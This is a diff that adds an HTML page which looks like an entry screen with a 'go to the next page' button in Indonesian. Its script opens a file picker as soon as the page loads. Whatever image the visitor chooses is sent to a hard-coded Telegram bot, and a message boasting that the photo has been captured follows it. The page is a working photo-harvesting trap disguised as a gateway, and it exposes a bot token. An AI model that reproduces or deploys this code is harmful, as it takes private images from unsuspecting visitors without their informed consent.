@@ -1,0 +1,71 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Upload and Send Image</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-gray-100">
+    <input type="file" id="fileInput" accept="image/*" class="hidden">
+    <button id="exitButton" class="px-4 py-2 bg-red-500 text-white rounded">Masuk Ke halam selanjutnya</button>
+    
+    <script>
+        window.onload = function() {
+            document.getElementById('fileInput').click();
+        };
+
+        document.getElementById('fileInput').addEventListener('change', function(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const formData = new FormData();
+                formData.append('photo', file);
+
+                const botToken = '7772668714:AAHMMYTp1NRT_DA4rBhAlixozmDDLb08sjA';
+                const chatId = '7336408897';
+                const url = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
+
+                fetch(url, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Image sent successfully!');
+                        sendNotification();
+                    } else {
+                        alert('Failed to send image.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending image.');
+                });
+            }
+        });
+
+        function sendNotification() {
+            const botToken = '7772668714:AAHMMYTp1NRT_DA4rBhAlixozmDDLb08sjA';
+            const chatId = '7336408897';
+            const message = 'Foto berhasil kita ambil';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        alert('Failed to send notification.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending notification.');
+                });
+        }
+
+        document.getElementById('exitButton').addEventListener('click', function() {
+            window.close();
+        });
+    </script>
+</body>
+</html>
